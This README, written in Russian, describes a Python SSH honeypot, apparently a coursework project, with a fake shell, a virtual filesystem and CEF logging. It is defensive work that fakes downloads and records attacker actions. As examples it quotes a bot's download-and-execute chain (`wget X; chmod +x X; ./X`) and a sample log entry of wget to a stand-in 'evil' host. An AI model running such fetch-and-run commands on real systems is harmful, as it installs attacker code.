# SSH Honeypot

Medium-interaction SSH-ханипот на Python: настоящий SSH-сервер на [AsyncSSH](https://asyncssh.readthedocs.io/), за которым стоит эмулятор bash-подобной оболочки с виртуальной файловой системой и структурированным аудитом всех действий атакующего в формате CEF.

---

## Что умеет

### SSH-сервер
- Полноценный SSH-2 на [AsyncSSH](https://github.com/ronf/asyncssh) в серверном режиме (`asyncssh.SSHServer`).
- Аутентификация по паролю с тремя политиками (`config.yaml`):
  - `accept_all` - пускает любого, удобно для сбора brute-сценариев;
  - `dictionary` - словарь пар «логин/пароль»;
  - `never` - все попытки отбиваются (полезно для подсчёта чистого brute-трафика).
- Каждая попытка логина (успешная или нет) фиксируется как событие `auth_attempt` / `auth_success` с источником, пользователем и паролем.
- Host-ключ генерируется автоматически при первом запуске (`keys/ssh_host_rsa_key`) и переживает рестарты.

### Эмуляция терминала
Полностью самописный line editor поверх raw-PTY, без встроенного `asyncssh.line_editor`:
- Эхо вводимых символов с правильной обработкой `\r\n` для PTY и без - для exec-режима и буферов редиректа.
- Поддержка **в одной строке**: Backspace, Delete, <-/->, **Home/End**, **Ctrl+<- / Ctrl+-> (по словам)**, **Alt+b / Alt+f** (readline-style).
- История команд: ↑/↓ для навигации, лимит 1000, дубли подряд не пишутся.
- **Tab-автодополнение**:
  - первое слово - по имени команды;
  - последующие - по путям VFS (с автоподстановкой `/` для каталогов);
  - при множественных совпадениях достраивается до общего префикса, при необходимости - список выводится под промптом.
- Ctrl-C - отмена текущей строки, Ctrl-D на пустой - отключение.
- **Exec-режим**: `ssh host 'команда'` без PTY - короткий путь без line editor'а, важен для бот-сценариев.

### Виртуальная файловая система
Гибридная двухслойная VFS ([fs/](src/honeypot/fs/)):
- **`BaseFS`** - read-only, неизменяемый, загружается из YAML-шаблона (`config/filesystem.yaml`). **Разделяется между всеми сессиями.**
- **`OverlayFS`** - per-session copy-on-write поверх базы. Хранит изменения в Python-словаре в памяти, при разрыве сессии всё уничтожается вместе с объектом сессии.
- Tombstone-маркеры на удаление базовых файлов: атакующий думает, что удалил `/etc/passwd`, но в следующей сессии файл снова на месте.
- Унифицированный API `VFS`: `resolve / chdir / list / stat / read / write / append / mkdir / rmdir / unlink / touch` с правильной нормализацией путей (`~`, `..`, `.`, абсолютные/относительные, кламп выхода за `/`).

В базе уже лежат правдоподобные системные файлы: `/etc/passwd`, `/etc/group`, `/etc/shadow` (с хэшами-заглушками), `/etc/os-release`, `/etc/hosts`, `/etc/resolv.conf`, `/etc/crontab`, `/etc/sudoers`, `/etc/network/interfaces`, `/etc/ssh/sshd_config`, `/etc/motd`, `/proc/{cpuinfo,meminfo,version,uptime,mounts}`, `/root/.bashrc`, `/root/.profile`, `/var/log/auth.log` и т.д. - плюс полный скелет директорий (`/boot`, `/sbin`, `/srv`, `/opt`, `/lib/x86_64-linux-gnu` и др.).

### Набор команд

**47 команд** ([shell/commands/](src/honeypot/shell/commands/)):

| Категория | Команды |
|---|---|
| Навигация и чтение | `pwd`, `cd`, `ls`, `cat`, `echo` |
| Идентичность / ядро | `whoami`, `id`, `uname`, `hostname` |
| Изменение ФС | `mkdir`, `touch`, `rm`, `cp`, `mv`, `chmod`, `chown`, `ln` |
| Shell-утилиты | `ps`, `history`, `clear`, `env`, `export`, `which`, `whereis` |
| Re-entry | `bash`, `sh`, `sudo` |
| "Загрузка" | `wget`, `curl` |
| Текст | `head`, `tail`, `wc`, `grep`, `find` |
| Разведка | `date`, `uptime`, `df`, `free`, `ifconfig`, `ip`, `netstat`, `ss`, `mount`, `dmesg`, `last`, `who`, `w`, `crontab`, `apt-get`/`apt` |

Каждая команда соответствует единому интерфейсу `Command.run(args, ctx) -> int` ([shell/commands/base.py](src/honeypot/shell/commands/base.py)). Реестр строится через `default_registry()` - добавить команду = создать один файл и одну строку в реестре.

#### Особые случаи
- **`bash -c "..."`** и **`sh -c "..."`** реально диспатчат внутреннюю строку через тот же шелл - каждая подкоманда логируется отдельно. Так покрываются типичные бот-цепочки `bash -c "cd /tmp; wget X; chmod +x X; ./X"`.
- **`bash script.sh`** - читает скрипт из VFS, пропускает комментарии и пустые строки, выполняет построчно.
- **`sudo cmd args...`** - сдирает sudo-флаги (`-u`, `-g`, ...) и переиспускает `cmd args` через тот же диспатчер.
- **`wget` / `curl`** - **никогда не делают реального HTTP-запроса**. Парсят URL через `urllib.parse`, печатают правдоподобный вывод (включая прогресс-бар curl) и создают плейсхолдер в overlay. В журнал пишется отдельное событие `download_attempt` с URL, хостом, портом и инструментом.

### Цепочки команд и редиректы
- **`;`** - безусловная цепочка
- **`&&`** - выполнить, если предыдущая команда вернула 0
- **`||`** - выполнить, если предыдущая вернула не 0
- **`>` / `>>`** - перезапись / append в файл (через VFS, в overlay сессии)
- **`<`** - чтение из файла как stdin (используется `cat < file`, `grep < file`, `wc < file` и т.д.)
- **`2>`** - перенаправление stderr отдельно от stdout
- **`&>`** - объединённый stdout+stderr в один файл

Парсинг редиректов корректно обрабатывает кавычки/экранирование: `echo "hi>not_op" > real` → токены `["echo", "hi>not_op", ">", "real"]`. Bash-семантика "открыть файл до выполнения команды" соблюдается: `nosuchcmd > /tmp/x` создаст пустой `/tmp/x` и вернёт `127`.

### Логирование (CEF)
Структурированный аудит в формате [ArcSight CEF](https://www.microfocus.com/documentation/arcsight/arcsight-smartconnectors-8.3/cef-implementation-standard/Content/CEF/Chapter%201%20What%20is%20CEF.htm) с ротацией:

```
CEF:0|Coursework|SSHHoneypot|0.1.0|300|command|3|rt=... src=1.2.3.4 suser=root sessionId=abc123 cmd=wget args=http://evil cwd=/tmp cs2Label=exitCode cs2=0
```

Три слоя ([audit/](src/honeypot/audit/)):
1. **`event_types.py`** - все типы событий как `EventType(id, name, severity)` - константы в одном файле. Добавить новый тип - одна строка.
2. **`recorder.py`** - `AuditRecorder` с типизированными методами (`session_connect`, `auth`, `command`, `download_attempt`, ...). Все CEF-поля живут здесь.
3. **`cef.py`** - `CefLogger` сериализует `Event` → CEF-строку и пишет через `RotatingFileHandler`.

Типы событий:

| ID  | Имя                 | Severity | Когда                                            |
|-----|---------------------|----------|--------------------------------------------------|
| 100 | session_connect     | 3        | TCP-подключение принято                          |
| 101 | session_disconnect  | 3        | соединение разорвано                             |
| 110 | session_start       | 3        | начало shell/exec сессии (после auth)            |
| 111 | session_end         | 3        | конец сессии с exit-кодом                        |
| 200 | auth_success        | 5        | пароль принят                                    |
| 201 | auth_attempt        | 4        | пароль отвергнут                                 |
| 300 | command             | 3        | каждая выполненная команда                       |
| 301 | unknown_command     | 4        | `bash: <cmd>: command not found`                 |
| 320 | download_attempt    | 7        | wget/curl с URL                                  |

Лог-файл: `logs/honeypot.cef`. Ротация: 10 МБ × 5 файлов (настраивается).

### Изоляция
- Каждый сеанс получает свой `OverlayFS`, свой `ShellContext`, свой emulator. `BaseFS` и `AuditRecorder` разделяются.
- Никаких системных вызовов: `ls`, `cat`, `ps`, `ifconfig` и т.д. отдают синтетические данные. Никаких реальных файлов хоста не видно.
- `wget`/`curl` физически не выходят в сеть - это парсер URL + плейсхолдер.

---

## Запуск

### Локально (без Docker, рекомендуется)
```powershell
uv sync
uv run python -m honeypot
# в другом окне:
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL root@127.0.0.1
```

### Docker (в процессе работы)
```powershell
docker compose up -d --build
```
Подключение:
```powershell
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL root@127.0.0.1
```

Логи:
```powershell
Get-Content logs\honeypot.cef -Tail 30   # на хосте, через bind-mount
docker compose logs -f honeypot          # консольный лог процесса
```

Контейнер запускается под непривилегированным пользователем `honeypot` (uid 1500), с `cap_drop: ALL` и `no-new-privileges` - defense-in-depth на случай гипотетического побега из эмулятора.

---

## Конфигурация

Три YAML-файла в [config/](config/):

| Файл                  | За что отвечает                                                          |
|-----------------------|--------------------------------------------------------------------------|
| `config.yaml`         | Порт, путь к host-key, политика авторизации, словарь паролей, пути логов |
| `system_profile.yaml` | Hostname, MOTD/banner, поля `uname -a`                                   |
| `filesystem.yaml`     | Дерево базовой ФС: директории и файлы с содержимым                       |

Менять можно на ходу - если в `docker-compose.yml` раскомментировать строку с `./config:/app/config:ro`, пересборка не нужна, только рестарт контейнера.

---

## Тесты

```powershell
uv run pytest -q
```

**141 тест**, покрывают:
- [tests/test_vfs.py](tests/test_vfs.py) - нормализация путей, copy-on-write изоляция между сессиями, tombstones, ошибки.
- [tests/test_commands.py](tests/test_commands.py) - базовый набор команд + audit-события.
- [tests/test_redirect.py](tests/test_redirect.py) - парсинг и применение `>`, `>>`, `<`, `2>`, `&>`, восстановление потоков.
- [tests/test_emulator.py](tests/test_emulator.py) - escape-парсер (включая Ctrl-arrow / Alt-f-b), пословное движение, Tab-комплит по командам и путям, `bash -c`, `sudo`.
- [tests/test_sysinfo.py](tests/test_sysinfo.py) - расширенный набор команд, текстовые утилиты, cp/mv/chmod, apt-get.

---

## Структура проекта

```
honeypot/
├── pyproject.toml              # зависимости (asyncssh, PyYAML)
├── uv.lock
├── Dockerfile                  # multi-stage сборка с uv
├── docker-compose.yml
├── .dockerignore
├── README.md
│
├── config/
│   ├── config.yaml             # порт, авторизация, лог
│   ├── system_profile.yaml     # hostname, uname, MOTD
│   └── filesystem.yaml         # базовая ФС
│
├── keys/                       # host-ключ (генерируется автоматически)
├── logs/                       # honeypot.cef (CEF-журнал)
│
├── src/honeypot/
│   ├── __main__.py             # точка входа
│   ├── config.py               # загрузка YAML
│   │
│   ├── audit/                  # CEF-аудит
│   │   ├── event_types.py      # константы типов событий
│   │   ├── recorder.py         # AuditRecorder (high-level API)
│   │   ├── cef.py              # сериализация + RotatingFileHandler
│   │   └── events.py           # dataclass Event
│   │
│   ├── core/
│   │   ├── server.py           # HoneypotSSHServer (auth, peer logging)
│   │   └── session.py          # HoneypotSessionFactory
│   │
│   ├── fs/
│   │   ├── base.py             # BaseFS
│   │   ├── overlay.py          # OverlayFS (copy-on-write)
│   │   └── vfs.py              # VFS facade + resolve()
│   │
│   └── shell/
│       ├── context.py          # ShellContext (stdin/stdout/stderr, history, env)
│       ├── emulator.py         # PTY line editor, диспатчер, парсер цепочек
│       ├── redirect.py         # парсинг и применение I/O-редиректов
│       └── commands/
│           ├── base.py
│           ├── __init__.py     # реестр
│           ├── bash.py         # bash/sh с -c и file-mode
│           ├── sudo.py
│           ├── cat.py, cd.py, ls.py, pwd.py, echo.py, ...
│           ├── mkdir.py, touch.py, rm.py
│           ├── fsops.py        # cp, mv, chmod, chown, ln
│           ├── textproc.py     # head, tail, wc, grep, find
│           ├── sysinfo.py      # hostname, date, uptime, df, free, ifconfig, ...
│           ├── wget.py, curl.py
│           └── ...
│
└── tests/
    ├── test_vfs.py
    ├── test_commands.py
    ├── test_redirect.py
    ├── test_emulator.py
    └── test_sysinfo.py
```

---

## Известные ограничения

- **Нет квот на overlay**: атакующий может записать произвольно большой файл - он ляжет в RAM контейнера. Возможно, стоит добавить лимит per-file и per-session.
- **Нет пайпов (`|`)**: только `;`, `&&`, `||` и редиректы. Бот-сценарии обычно используют именно `;`/`&&`, так что покрытие практически полное.
- **Нет SFTP/SCP**: каркас под SFTP-подсистему AsyncSSH заложен, но не реализован.
- **Tab-completion** работает только для команды и путей; флаги/глобы не доводятся.
- **Никакой реальной симуляции запуска бинарников**: `./malware.sh` после `chmod +x` приведёт к `bash: ./malware.sh: command not found`. Для реалистичной имитации можно было бы перехватывать через `bash` + содержимое файла.

---

## Стек

| Слой                       | Что используется                                  |
|----------------------------|---------------------------------------------------|
| Python                     | 3.10+                                             |
| SSH-сервер                 | `asyncssh ≥ 2.14`                                 |
| Криптография               | `cryptography` (как зависимость asyncssh)         |
| Конфиги                    | `PyYAML`                                          |
| Парсинг команд             | stdlib `shlex`, собственный escape/redirect-парсер|
| Сборка пакета              | `setuptools` (через `pyproject.toml`)             |
| Управление зависимостями   | `uv` + `uv.lock`                                  |
| Тесты                      | `pytest`                                          |
| Контейнер                  | Docker, `python:3.13-slim`, multi-stage с uv      |
